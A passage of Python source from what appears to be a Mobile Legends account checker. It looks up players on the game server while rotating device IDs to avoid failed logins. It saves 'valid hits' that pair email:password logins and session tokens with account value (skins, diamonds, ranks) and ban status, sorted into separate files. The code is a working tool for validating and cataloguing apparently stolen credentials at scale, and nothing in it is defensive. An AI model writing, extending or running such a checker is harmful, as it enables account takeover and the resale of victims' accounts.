            'last_login_country': last_login_country,
            'create_account_country': create_account_country,
            'high_rank': high_rank,
            'current_rank': current_rank,
            'achievement_points': achievement_points,
            'collector_point': collector_point,
            'collector_rank': collector_rank,
            'collector_tier': collector_tier,
            'hero_history': hero_history,
            'squad': squad,
            'squad_id': squad_id_display,
            'skin_breakdown': skin_counts,
            'affinity': affinity_label,
            'likes': likes,
            'credits_score': credits_score if credits_score and credits_score != "N/A" else None,
            'followers': followers,
            'popularity': popularity,
            'bio': bio if bio else None,
            'latest_skin_date': latest_skin_date,
            'starlight_user': starlight_user,
            'starlight_expiry': starlight_expiry,
            'starlight_months': starlight_months if starlight_months else None,
            'tickets': tickets if tickets else None,
            'total_wins': total_wins if total_wins else None,
            'restriction_flags': restriction_flags,
            'last_heroes_purchase': last_heroes_purchase,
            'mcl_champion_wins': mcl_wins,
            'v2l_status': v2l_status,
            'creation_date': creation_date,
            'account_age': account_age,
            'win_count': win_count,
            'total_battles': total_battles,
            'win_rate': win_rate,
            'battle_points': bp if bp else None,
            'diamonds': diamonds if diamonds else None,
            'last_diamond_purchase': last_diamond_purchase if last_diamond_purchase != "N/A" else None,
            'squad_motto': squad_motto if squad_motto and squad_motto != "N/A" else None,
            'starlight_count': starlight_count if starlight_count else None,
            'skin_history': skin_history_str if skin_history_str and skin_history_str != "N/A" else None,
            'emblem_levels': emblem_levels if emblem_levels and emblem_levels != "N/A" else None,
            'latest_skin_id': latest_skin_id_str if latest_skin_id_str != "N/A" else None,
        }
    except Exception as e:
        return None


def lookup_player_data(player_id_or_nickname, server_id=None, guid=None, session=None, combo_v2l=None):
    try:
        try:
            player_id = int(player_id_or_nickname)
            search_type = "id"
            search_value = player_id
            server_filter = None
        except ValueError:
            search_type = "nickname"
            search_value = str(player_id_or_nickname).strip()
            
            if not server_id:
                return {"error": "Server ID is required when searching by nickname", "status": "error"}
            
            try:
                server_filter = int(server_id)
            except ValueError:
                return {"error": "Server ID must be a number", "status": "error"}
        
        device_ids = load_device_ids()
        device_models = load_device_models()
        
        if not device_ids:
            return {"error": "No device IDs available - please add device IDs to DEVICE_IDS list", "status": "error"}
        
        retry_count = 0
        max_retries = 10
        result = None
        _creation_ts = 0
        current_device_ids = device_ids.copy()
        last_error = None
        
        while retry_count < max_retries and result is None and current_device_ids:
            current_device_id = random.choice(current_device_ids)
            current_device_model = random.choice(device_models) if device_models else None
            
            try:
                with GameConnection(device_id=current_device_id, device_model=current_device_model) as conn:
                    if not conn.connect_to_game_server():
                        last_error = "Failed to connect to game server"
                        if current_device_id in current_device_ids:
                            current_device_ids.remove(current_device_id)
                        retry_count += 1
                        continue

                    result = conn.lookup_player(search_value, search_type, server_filter)
                    _creation_ts = conn.creation_ts

                    if result is None:
                        last_error = "Lookup returned None"
                        retry_count += 1
                        role_info_data = None
                    else:
                        _res_role_id = result[0][0].get(0, search_value) if (result and result[0]) else search_value
                        _res_zone_id = result[0][0].get(1, 0) if (result and result[0]) else 0

                        role_info_data = None

                        try:
                            skin_role_info = conn.get_skin_role_info(_res_role_id, _res_zone_id)

                            if skin_role_info and isinstance(skin_role_info, dict):
                                if role_info_data is None:
                                    role_info_data = {}
                                for _k, _v in skin_role_info.items():
                                    role_info_data[_k] = _v
                                dbg(f"SKIN MERGE: tag118 found and merged into role_info_data", color=Fore.GREEN)
                        except Exception as e:
                            last_error = f"Skin role info failed: {str(e)}"

                        _v2l_data = None
                        try:
                            _v2l_data = conn.get_v2l_status(_res_role_id, _res_zone_id)
                            if _v2l_data and isinstance(_v2l_data, dict):
                                _src = _v2l_data.get("_source", "?")
                                _tags = list(_v2l_data.get("_data", {}).keys())
                                dbg(f"V2L DATA: src={_src} tags={_tags}", color=Fore.GREEN)
                        except Exception as e:
                            dbg(f"V2L status fetch failed: {e}", color=Fore.RED)

                
            except ConnectionError as e:
                error_msg = str(e)
                last_error = f"Connection error: {error_msg}"
                if "LOGIN_FAILED" in error_msg:
                    remove_failed_device_id(current_device_id)
                    if current_device_id in current_device_ids:
                        current_device_ids.remove(current_device_id)
                else:
                    if current_device_id in current_device_ids:
                        current_device_ids.remove(current_device_id)
                
                retry_count += 1
                if not current_device_ids:
                    current_device_ids = load_device_ids()
                    if not current_device_ids:
                        break
            except socket.timeout as e:
                last_error = f"Socket timeout: {str(e)}"
                if current_device_id in current_device_ids:
                    current_device_ids.remove(current_device_id)
                retry_count += 1
            except Exception as e:
                last_error = f"Unexpected error: {type(e).__name__}: {str(e)}"
                if current_device_id in current_device_ids:
                    current_device_ids.remove(current_device_id)
                retry_count += 1
        
        if result:
            v2l_data = locals().get('_v2l_data', None)
            player_data = extract_player_data(result, role_info=role_info_data, creation_ts=_creation_ts, v2l_data=v2l_data)
            if player_data:
                if player_data.get('v2l_status', 'N/A') == 'N/A' and combo_v2l:
                    player_data['v2l_status'] = combo_v2l
                response_data = {
                    "status": "success",
                    "player_data": player_data
                }
                return response_data
            else:
                return {"error": "Error extracting player data from result", "status": "error"}
        else:
            if last_error:
                return {"error": last_error, "status": "error"}
            return {"error": "Player not found after all retries", "status": "error"}
            
    except Exception as e:
        return {"error": f"Critical error in lookup: {type(e).__name__}: {str(e)}", "status": "error"}


# ── OUTPUT FUNCTIONS ──────────────────────────────────────────────────
results_lock  = threading.Lock()
valid_results = []
error_results = []
hit_counter   = 0
file_counters = {}

v2l_yes_count  = 0
v2l_no_count   = 0
ban_true_count = 0
ban_false_count= 0
processed_count= 0
status_line_started = False

COLLECTOR_TIERS = [
    "Amateur Collector",
    "Junior Collector",
    "Seasoned Collector",
    "Expert Collector",
    "Renowned Collector",
    "Exalted Collector",
    "Mega Collector",
    "World Collector",
    "No Tier",
]
collector_stats = {t: 0 for t in COLLECTOR_TIERS}
collector_stats["Other"] = 0


def _get_major_tier(tier_str):
    if not tier_str or tier_str in ("Unknown", ""):
        return "No Tier"
    for t in COLLECTOR_TIERS:
        if tier_str.startswith(t):
            return t
    return "Other"


def save_line(filepath, line):
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with results_lock:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(line + "\n")
    except Exception:
        pass


def save_block_to_file(filepath, account_info, player_data):
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with results_lock:
            file_counters[filepath] = file_counters.get(filepath, 0) + 1
            num = file_counters[filepath]
        block = build_save_block(account_info, player_data, num)
        with results_lock:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(block + "\n")
    except Exception:
        pass


def build_output_line(account_info, player_data, hit_num):
    email      = account_info.get("email", "?")
    password   = account_info.get("password", "?")
    v2l        = player_data.get("v2l_status", account_info.get("V2L", account_info.get("V2L Status", "N/A")))
    guid       = account_info.get("GUID", "N/A")
    session    = account_info.get("Session", "N/A")
    level      = account_info.get("Level", player_data.get("level", "N/A"))
    role_id    = account_info.get("Role ID", account_info.get("role_id", "N/A"))
    zone_id    = account_info.get("Zone ID", account_info.get("zone_id", "N/A"))
    uid        = account_info.get("UID", "N/A")
    region     = account_info.get("Region", "N/A")
    c_rank     = player_data.get("current_rank", account_info.get("Current Rank", "N/A"))
    h_rank     = player_data.get("high_rank", account_info.get("Highest Rank", "N/A"))
    bindings   = account_info.get("Bindings", "N/A")
    ban_status = account_info.get("Ban Status", "N/A")
    ban_reason = account_info.get("Ban Reason", "-")

    name             = player_data.get("nickname", "N/A")
    skin_count       = player_data.get("skin_count", 0)
    hero_count       = player_data.get("hero_count", 0)
    collector_point  = player_data.get("collector_point", 0)
    collector_tier   = player_data.get("collector_tier", "N/A")
    achievement_pts  = player_data.get("achievement_points", 0)
    squad            = player_data.get("squad", "—")
    last_login       = player_data.get("last_login", "N/A")
    rating_score     = player_data.get("rating_score", 0)
    location         = player_data.get("location", "NOT FOUND")
    hero_history_raw = player_data.get("hero_history", [])
    hero_history_str       = ", ".join(hero_history_raw) if hero_history_raw else "N/A"
    create_account_country = player_data.get("create_account_country", "N/A")
    affinity        = player_data.get("affinity", 0)
    likes           = player_data.get("likes", 0)
    credits_score   = player_data.get("credits_score", 0)
    followers       = player_data.get("followers", 0)
    popularity      = player_data.get("popularity", 0)
    latest_skin_date = player_data.get("latest_skin_date", "N/A")
    latest_skin_id   = player_data.get("latest_skin_id", "N/A")
    latest_skin_tier = player_data.get("latest_skin_tier", "N/A")
    starlight_user  = player_data.get("starlight_user", "N/A")
    restriction_flags = player_data.get("restriction_flags", "None")
    last_heroes_purchase = player_data.get("last_heroes_purchase", "N/A")
    mcl_champion_wins = player_data.get("mcl_champion_wins", 0)
    creation_date   = player_data.get("creation_date", "N/A")
    total_battles   = player_data.get("total_battles", 0)
    win_rate        = player_data.get("win_rate", "N/A")
    
    line = (
        f"{hit_num}. LOGIN: {email}:{password} "
        f"V2L Status: {v2l} "
        f"NAME: {name} "
        f"LEVEL: {level} "
        f"Country: {create_account_country} "
        f"Skin Count: {skin_count} "
        f"Hero Count: {hero_count} "
        f"Collector Point: {collector_point} "
        f"Collector Tier: {collector_tier} "
        f"Achievement Points: {achievement_pts} "
        f"Squad: {squad} "
        f"CURRENT RANK: {c_rank} "
        f"HIGHEST RANK: {h_rank} "
        f"BINDINGS: {bindings} "
        f"BAN STATUS: {ban_status} "
        f"MLBB INFO: Region: {region} "
        f"UID: {uid} "
        f"Role ID: {role_id} "
        f"Zone ID: {zone_id} "
        f"GUID: {guid} "
        f"Session: {session} "
        f"Last Login: {last_login} "
        f"Location: {location} "
        f"History: {hero_history_str} "
        f"Rating Score: {rating_score} "
        f"Affinity: {affinity} "
        f"Likes: {likes} "
    )
    
    if credits_score:
        line += f"Credits Score: {credits_score} "
    line += f"Followers: {followers} "
    line += f"Popularity: {popularity} "
    
    bio_val = player_data.get('bio')
    if bio_val:
        line += f"Bio: {bio_val} "
    
    line += (
        f"Latest Skin Purchase Date: {latest_skin_date} "
        f"Latest Skin ID: {latest_skin_id} "
        f"Latest Skin Tier: {latest_skin_tier} "
        f"Starlight User: {starlight_user} "
        f"Restriction Flags: {restriction_flags} "
        f"Last Heroes Purchase: {last_heroes_purchase} "
        f"MCL Champion Wins: {mcl_champion_wins} "
        f"Creation Date: {creation_date} "
        f"Total Battles: {total_battles} "
        f"Win Rate: {win_rate} "
        f"Diamonds: {player_data.get('diamonds', 0) or 0} "
        f"Battle Points: {player_data.get('battle_points', 0) or 0} "
        f"Tickets: {player_data.get('tickets', 0) or 0} "
    )
    
    last_diamond = player_data.get('last_diamond_purchase')
    if last_diamond and last_diamond != "N/A":
        line += f"Last Diamond Purchase: {last_diamond} "
    
    return line.rstrip()


def build_save_block(account_info, player_data, hit_num):
    email      = account_info.get("email", "?")
    password   = account_info.get("password", "?")
    v2l        = player_data.get("v2l_status", account_info.get("V2L", account_info.get("V2L Status", "N/A")))
    guid       = account_info.get("GUID", "N/A")
    session    = account_info.get("Session", "N/A")
    level      = account_info.get("Level", player_data.get("level", "N/A"))
    role_id    = account_info.get("Role ID", account_info.get("role_id", "N/A"))
    zone_id    = account_info.get("Zone ID", account_info.get("zone_id", "N/A"))
    uid        = account_info.get("UID", "N/A")
    region     = account_info.get("Region", "N/A")
    c_rank     = player_data.get("current_rank", account_info.get("Current Rank", "N/A"))
    h_rank     = player_data.get("high_rank", account_info.get("Highest Rank", "N/A"))
    bindings   = account_info.get("Bindings", "N/A")
    ban_status = account_info.get("Ban Status", "N/A")

    name             = player_data.get("nickname", "N/A")
    skin_count       = player_data.get("skin_count", 0)
    hero_count       = player_data.get("hero_count", 0)
    collector_point  = player_data.get("collector_point", 0)
    collector_tier   = player_data.get("collector_tier", "N/A")
    achievement_pts  = player_data.get("achievement_points", 0)
    squad            = player_data.get("squad", "—")
    last_login       = player_data.get("last_login", "N/A")
    location         = player_data.get("location", "NOT FOUND")
    hero_history_raw = player_data.get("hero_history", [])
    hero_history_str = ", ".join(hero_history_raw) if hero_history_raw else "N/A"
    create_account_country = player_data.get("create_account_country", "N/A")
    rating_score     = player_data.get("rating_score", 0)
    affinity        = player_data.get("affinity", 0)
    likes           = player_data.get("likes", 0)
    credits_score   = player_data.get("credits_score", 0)
    followers       = player_data.get("followers", 0)
    popularity      = player_data.get("popularity", 0)
    latest_skin_date = player_data.get("latest_skin_date", "N/A")
    latest_skin_id   = player_data.get("latest_skin_id", "N/A")
    latest_skin_tier = player_data.get("latest_skin_tier", "N/A")
    starlight_user  = player_data.get("starlight_user", "N/A")
    restriction_flags = player_data.get("restriction_flags", "None")
    last_heroes_purchase = player_data.get("last_heroes_purchase", "N/A")
    mcl_champion_wins = player_data.get("mcl_champion_wins", 0)
    creation_date   = player_data.get("creation_date", "N/A")
    diamonds        = player_data.get("diamonds", 0) or 0
    battle_points   = player_data.get("battle_points", 0) or 0
    tickets_bd      = player_data.get("tickets", 0) or 0
    last_diamond_purchase = player_data.get("last_diamond_purchase", "N/A") or "N/A"
    SEP = "=" * 70
    W   = 25

    lines = [
        SEP,
        f"  VALID HIT #{hit_num}",
        SEP,
        f"  {'LOGIN:':<{W}} {email}:{password}",
        f"  {'V2L Status:':<{W}} {v2l}",
        f"  {'NAME:':<{W}} {name}",
        f"  {'LEVEL:':<{W}} {level}",
        f"  {'Country:':<{W}} {create_account_country}",
        f"  {'Creation Date:':<{W}} {creation_date}",
        f"  {'Skin Count:':<{W}} {skin_count}",
        f"  {'Hero Count:':<{W}} {hero_count}",
        f"  {'Collector Point:':<{W}} {collector_point}",
        f"  {'Collector Tier:':<{W}} {collector_tier}",
        f"  {'Supreme Skins':<{W}} : {player_data.get('skin_breakdown', {}).get('Supreme Skins', 0)}",
        f"  {'Grand Skins':<{W}} : {player_data.get('skin_breakdown', {}).get('Grand Skins', 0)}",
        f"  {'Exquisite Skins':<{W}} : {player_data.get('skin_breakdown', {}).get('Exquisite Skins', 0)}",
        f"  {'Deluxe Skins':<{W}} : {player_data.get('skin_breakdown', {}).get('Deluxe Skins', 0)}",
        f"  {'Exceptional Skins':<{W}} : {player_data.get('skin_breakdown', {}).get('Exceptional Skins', 0)}",
        f"  {'Common Skins':<{W}} : {player_data.get('skin_breakdown', {}).get('Common Skins', 0)}",
        f"  {'Achievement Points:':<{W}} {achievement_pts}",
        f"  {'Squad:':<{W}} {squad}",
        f"  {'CURRENT RANK:':<{W}} {c_rank}",
        f"  {'HIGHEST RANK:':<{W}} {h_rank}",
        f"  {'BINDINGS:':<{W}} {bindings}",
        f"  {'BAN STATUS:':<{W}} {ban_status}",
        f"  {'MLBB INFO: Region:':<{W}} {region}",
        f"  {'UID:':<{W}} {uid}",
        f"  {'Role ID:':<{W}} {role_id}",
        f"  {'Zone ID:':<{W}} {zone_id}",
        f"  {'GUID:':<{W}} {guid}",
        f"  {'Session:':<{W}} {session}",
        f"  {'Last Login:':<{W}} {last_login}",
        f"  {'Location:':<{W}} {location}",
        "",
        f"  {'Rating Score:':<{W}} {rating_score}",
        f"  {'Affinity:':<{W}} {affinity}",
        f"  {'Likes:':<{W}} {likes}",
    ]
    
    if credits_score and credits_score != "N/A":
        lines.append(f"  {'Credits Score:':<{W}} {credits_score}")
    
    lines.extend([
        f"  {'Followers:':<{W}} {followers}",
        f"  {'Popularity:':<{W}} {popularity}",
    ])
    
    bio_val = player_data.get('bio')
    if bio_val:
        lines.append(f"  {'Bio:':<{W}} {bio_val}")
    
    lines.extend([
        f"  {'Latest Skin Purchase Date:':<{W}} {latest_skin_date}",
        f"  {'Latest Skin ID:':<{W}} {latest_skin_id}",
        f"  {'Latest Skin Tier:':<{W}} {latest_skin_tier}",
        f"  {'Starlight User:':<{W}} {starlight_user}",
        f"  {'Restriction Flags:':<{W}} {restriction_flags}",
        f"  {'Last Heroes Purchase:':<{W}} {last_heroes_purchase}",
        f"  {'MCL Champion Wins:':<{W}} {mcl_champion_wins}",
        "",
        f"  {'Total Battles:':<{W}} {player_data.get('total_battles', 0)}",
        f"  {'Win Rate:':<{W}} {player_data.get('win_rate', 'N/A')}",
        f"  {'Diamonds:':<{W}} {diamonds}",
        f"  {'Battle Points (BP):':<{W}} {battle_points}",
        f"  {'Tickets:':<{W}} {tickets_bd}",
    ])
    
    if last_diamond_purchase != 'N/A':
        lines.append(f"  {'Last Diamond Purchase:':<{W}} {last_diamond_purchase}")
    
    lines.extend([
        "",
        f"  {'History:':<{W}} {hero_history_str}",
        SEP,
        "",
    ])
    return "\n".join(lines)


def print_processing_status(processed, total, v2l_yes, v2l_no, ban_true, ban_false, all_hits):
    global status_line_started
    
    status_line = (
        f"{Fore.YELLOW}Processing: {processed}/{total} | "
        f"{Fore.GREEN}V2L YES: {v2l_yes}{Fore.YELLOW} | "
        f"{Fore.RED}V2L NO: {v2l_no}{Fore.YELLOW} | "
        f"{Fore.RED}BAN TRUE: {ban_true}{Fore.YELLOW} | "
        f"{Fore.GREEN}BAN FALSE: {ban_false}{Fore.YELLOW} | "
        f"{Fore.CYAN}ALL HITS: {all_hits}{Style.RESET_ALL}"
    )
    
    if not status_line_started:
        print(f"\n{status_line}", end="", flush=True)
        status_line_started = True
    else:
        print(f"\r{status_line}", end="", flush=True)


def print_hit_line(email, password, skin_count, collector_tier, hit_num):
    print(f"{Fore.GREEN}✅  {email}:{password} =>  Skin Count: {skin_count}  | Collector Tier: {collector_tier}{Style.RESET_ALL}")


# ── DEVICE CHECK FUNCTIONS ──────────────────────────────────────────

def lookup_and_save(account_info, thread_id=1, total=1):
    global hit_counter, v2l_yes_count, v2l_no_count, ban_true_count, ban_false_count
    try:
        if not account_info:
            return None

        orig_line  = account_info.get('original_line', '')

        if 'role_id' not in account_info or 'zone_id' not in account_info:
            uid_info = account_info.get('UID', '')
            if uid_info and '(' in uid_info:
                try:
                    uid_part, zone_part = uid_info.split('(')
                    role_id = int(uid_part.strip())
                    zone_id = int(zone_part.rstrip(')').strip())
                    account_info['role_id'] = role_id
                    account_info['zone_id'] = zone_id
                except:
                    pass

        if 'role_id' not in account_info or 'zone_id' not in account_info:
            return None

        role_id    = account_info['role_id']
        zone_id    = account_info['zone_id']
        email      = account_info.get('email', '?')
        guid       = account_info.get('Guid', None)
        session    = account_info.get('Session', None)
        
        try:
            role_id = int(role_id)
            zone_id = int(zone_id)
        except (ValueError, TypeError):
            return None
        
        if role_id <= 0 or zone_id <= 0:
            return None

        max_retries = 2
        retry_count = 0
        result = None
        
        while retry_count <= max_retries and (result is None or result.get("status") == "error"):
            result_holder = [None]
            _combo_v2l = account_info.get("V2L", account_info.get("V2L Status", "N/A"))
            def _do_lookup():
                result_holder[0] = lookup_player_data(role_id, zone_id, guid=guid, session=session, combo_v2l=_combo_v2l)

            t = threading.Thread(target=_do_lookup, daemon=True)
            t.start()
            t.join(timeout=10)
            if t.is_alive():
                if retry_count < max_retries:
                    retry_count += 1
                    time.sleep(0.5)
                    continue
                else:
                    return {'status': 'timeout'}

            result = result_holder[0]
            if result is None:
                result = {"error": "No result", "status": "error"}
            
            if result.get("status") == "error":
                err_msg = result.get("error", "")
                retryable_errors = ["Connection error", "Socket timeout", "Failed to connect", "timeout", "Internal server error"]
                if any(retry_err.lower() in err_msg.lower() for retry_err in retryable_errors) and retry_count < max_retries:
                    retry_count += 1
                    time.sleep(0.5)
                    continue
                else:
                    break
            else:
                break

        if result.get("status") == "success":
            player_data = result.get('player_data', {})

            v2l        = account_info.get("V2L", account_info.get("V2L Status", "N/A"))
            ban_status = account_info.get("Ban Status", "N/A")

            with results_lock:
                hit_counter += 1
                current_num = hit_counter
                if str(v2l).strip().lower() in ("yes", "1", "true", "enabled"):
                    v2l_yes_count += 1
                else:
                    v2l_no_count += 1
                ban_upper = str(ban_status).strip().upper()
                if ban_upper in ("TRUE", "YES", "1", "BANNED"):
                    ban_true_count += 1
                else:
                    ban_false_count += 1
                tier_key = _get_major_tier(player_data.get("collector_tier", ""))
                if tier_key in collector_stats:
                    collector_stats[tier_key] += 1
                else:
                    collector_stats["Other"] += 1

            skin_count = player_data.get("skin_count", 0)
            collector_tier = player_data.get("collector_tier", "N/A")
            print_hit_line(email, account_info.get('password', '?'), skin_count, collector_tier, current_num)

            save_block_to_file(VALID_FILE,    account_info, player_data)
            save_block_to_file(ALL_HITS_FILE, account_info, player_data)

            if str(v2l).strip().lower() in ("yes", "1", "true", "enabled"):
                save_block_to_file(V2L_YES_FILE, account_info, player_data)
            else:
                save_block_to_file(V2L_NO_FILE, account_info, player_data)

            ban_upper2 = str(ban_status).strip().upper()
            if ban_upper2 in ("TRUE", "YES", "1", "BANNED"):
                save_block_to_file(BAN_TRUE_FILE, account_info, player_data)
            else:
                save_block_to_file(BAN_FALSE_FILE, account_info, player_data)

            with results_lock:
                valid_results.append({'line': '', 'player_data': player_data})

            return {'status': 'success'}

        else:
            return {'status': 'error'}

    except Exception as e:
        return {'status': 'error'}


def print_final_summary(total_time, total_accounts):
    v = len(valid_results)
    e = len(error_results)

    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  FINAL SUMMARY{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Total Processed  : {total_accounts}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Valid Hits        : {v}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Errors           : {e}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Time Elapsed     : {total_time:.2f}s{Style.RESET_ALL}")
    print(f"\n  {Fore.WHITE}Results saved to:{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}ALL HITS  → {ALL_HITS_FILE}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}V2L YES   → {V2L_YES_FILE}{Style.RESET_ALL}")
    print(f"  {Fore.RED}V2L NO    → {V2L_NO_FILE}{Style.RESET_ALL}")
    print(f"  {Fore.RED}BAN TRUE  → {BAN_TRUE_FILE}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}BAN FALSE → {BAN_FALSE_FILE}{Style.RESET_ALL}")
    print(f"  {Fore.RED}ERRORS    → {ERROR_FILE}{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  COLLECTOR TIER DISTRIBUTION{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    for tier in COLLECTOR_TIERS:
        count = collector_stats.get(tier, 0)
        bar   = f"{'#' * count}" if count <= 30 else f"{'#' * 30}+"
        print(f"  {Fore.YELLOW}{tier:<25}{Style.RESET_ALL} : {Fore.WHITE}{count:>4}  {Fore.GREEN}{bar}{Style.RESET_ALL}")
    if collector_stats.get("Other", 0) > 0:
        print(f"  {Fore.YELLOW}{'Other':<25}{Style.RESET_ALL} : {Fore.WHITE}{collector_stats['Other']:>4}{Style.RESET_ALL}")

    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def run_device_check():
    """Check a single device using Device ID, Account ID, Zone ID format."""
    global DEBUG_MODE
    DEBUG_MODE = True

    print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  DEVICE CHECK MODE{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}\n")

    print(f"{Fore.CYAN}Paste device info in this format:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Device ID: and_xxx{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Account ID: 123456{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Zone ID: 1234{Style.RESET_ALL}")
    print()

    lines = []
    print(f"{Fore.CYAN}Enter device info (type 'done' when finished):{Style.RESET_ALL}")
    while True:
        line = input().strip()
        if line.lower() == 'done':
            break
        if line:
            lines.append(line)
    
    if not lines:
        print(f"{Fore.RED}No input provided.{Style.RESET_ALL}")
        return

    device_info = parse_device_line('\n'.join(lines))
    if not device_info:
        print(f"{Fore.RED}Could not parse device info. Make sure Device ID, Account ID, Zone ID are present.{Style.RESET_ALL}")
        return

    device_id = device_info.get('device_id')
    account_id = device_info.get('account_id')
    zone_id = device_info.get('zone_id')

    print(f"\n{Fore.CYAN}Device ID : {device_id}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Account ID: {account_id}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Zone ID   : {zone_id}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Starting lookup...{Style.RESET_ALL}\n")

    result = lookup_player_data(account_id, zone_id)

    print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  RESULT{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")

    if result.get("status") == "success":
        player_data = result["player_data"]
        print(f"{Fore.GREEN}  STATUS    : SUCCESS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  DEVICE INFO:{Style.RESET_ALL}")
        print(f"    Device ID: {device_id}")
        print(f"    Account ID: {account_id}")
        print(f"    Zone ID: {zone_id}")
        print(f"    Status: REGISTERED")
        print(f"    Lookup: success")
        print(f"\n{Fore.CYAN}  PLAYER INFO:{Style.RESET_ALL}")
        print(f"    Nickname: {player_data.get('nickname', 'Unknown')}")
        print(f"    Level: {player_data.get('level', 'Unknown')}")
        print(f"    Heroes: {player_data.get('hero_count', 0)}")
        print(f"    Skins: {player_data.get('skin_count', 0)}")
        print(f"    Current Rank: {player_data.get('current_rank', 'Unknown')}")
        print(f"    Highest Rank: {player_data.get('high_rank', 'Unknown')}")
        print(f"    Collector: {player_data.get('collector_tier', 'No Tier')}")
        print(f"    Collector Pts: {player_data.get('collector_point', 0)}")
        print(f"    Ban Status: False")
        print(f"    Location: {player_data.get('location', 'NOT FOUND')}")
        print(f"    Last Login: {player_data.get('last_login', 'N/A')}")
        print(f"    Creation Date: {player_data.get('creation_date', 'N/A')}")
        
        skin_bd = player_data.get("skin_breakdown", {})
        if skin_bd:
            print(f"    Skin Breakdown:")
            tier_order = ["Supreme Skins", "Grand Skins", "Exquisite Skins", "Deluxe Skins", "Exceptional Skins", "Common Skins"]
            for tier in tier_order:
                cnt = skin_bd.get(tier, 0)
                print(f"      {tier}: {cnt}")
    else:
        print(f"{Fore.RED}  STATUS    : ERROR{Style.RESET_ALL}")
        print(f"{Fore.RED}  ERROR     : {result.get('error','Unknown')}{Style.RESET_ALL}")

    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}\n")

    input(f"{Fore.CYAN}Press ENTER to return to menu...{Style.RESET_ALL}")


def run_bulk_device_check():
    """Bulk check devices from a file with Device ID, Account ID, Zone ID format."""
    global DEBUG_MODE, valid_results, error_results, hit_counter, status_line_started
    DEBUG_MODE = False

    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  BULK DEVICE CHECK MODE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

    print(f"{Fore.CYAN}Enter filepath containing device info (one device per block):{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Device ID: and_xxx{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Account ID: 123456{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Zone ID: 1234{Style.RESET_ALL}")
    print(f"{Fore.WHITE}(separate each device block with blank line){Style.RESET_ALL}")
    print()

    input_file = input(f"{Fore.CYAN}File path: {Style.RESET_ALL}").strip().replace('"', '')

    if not os.path.exists(input_file):
        print(f"{Fore.RED}Error: File '{input_file}' not found!{Style.RESET_ALL}")
        return

    # Parse devices from file
    devices = []
    with open(input_file, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Split by blank lines to get device blocks
    blocks = content.strip().split('\n\n')
    
    for block in blocks:
        if not block.strip():
            continue
        info = parse_device_line(block)
        if info:
            info['original_block'] = block
            devices.append(info)

    if not devices:
        print(f"{Fore.RED}No valid devices found in file.{Style.RESET_ALL}")
        return

    # Reset counters
    valid_results = []
    error_results = []
    hit_counter   = 0
    file_counters.clear()
    global v2l_yes_count, v2l_no_count, ban_true_count, ban_false_count, processed_count
    v2l_yes_count  = 0
    v2l_no_count   = 0
    ban_true_count = 0
    ban_false_count= 0
    processed_count= 0
    status_line_started = False
    for k in collector_stats:
        collector_stats[k] = 0

    total = len(devices)
    print(f"{Fore.GREEN}Loaded   : {total} devices{Style.RESET_ALL}")
    print()

    try:
        max_threads = int(input(f"{Fore.CYAN}Threads (default 50): {Style.RESET_ALL}").strip() or "50")
    except ValueError:
        max_threads = 50

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(process_device, device, i % max_threads + 1, total): device
            for i, device in enumerate(devices)
        }
        for future in as_completed(futures):
            try:
                future.result(timeout=120)
            except Exception as e:
                print(f"\n{Fore.RED}Thread error: {e}{Style.RESET_ALL}", flush=True)
            with results_lock:
                processed_count += 1
                _pc = processed_count
                _vy = v2l_yes_count
                _vn = v2l_no_count
                _bt = ban_true_count
                _bf = ban_false_count
                _ah = hit_counter
            print_processing_status(_pc, total, _vy, _vn, _bt, _bf, _ah)

    total_time = time.time() - start_time
    print_final_summary(total_time, total)

    input(f"\n{Fore.CYAN}Press ENTER to return to menu...{Style.RESET_ALL}")


def process_device(device_info, thread_id=1, total=1):
    """Process a single device and save results."""
    global hit_counter, v2l_yes_count, v2l_no_count, ban_true_count, ban_false_count
    
    try:
        device_id = device_info.get('device_id')
        account_id = device_info.get('account_id')
        zone_id = device_info.get('zone_id')
        
        if not device_id or not account_id or not zone_id:
            return None
        
        result = lookup_player_data(account_id, zone_id)
        
        if result.get("status") == "success":
            player_data = result.get('player_data', {})
            
            # Build output for this device
            output_lines = []
            output_lines.append("DEVICE INFO:")
            output_lines.append(f"Device ID: {device_id}")
